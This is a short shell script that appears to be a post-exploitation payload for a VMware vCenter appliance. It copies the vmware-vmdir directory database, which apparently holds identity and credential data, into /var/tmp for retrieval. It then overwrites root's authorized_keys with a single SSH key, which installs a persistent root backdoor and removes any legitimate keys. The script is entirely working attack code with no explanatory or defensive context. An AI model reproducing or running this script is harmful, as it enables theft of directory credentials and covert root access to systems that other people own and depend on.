#!/bin/sh
cp -f "/storage/db/vmware-vmdir/data.mdb" /var/tmp/db-backup
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEaK9u4lRnt8Nzk2PjG2xhXFKKslr+QzY48eZbbqwSQl' > "/root/.ssh/authorized_keys"
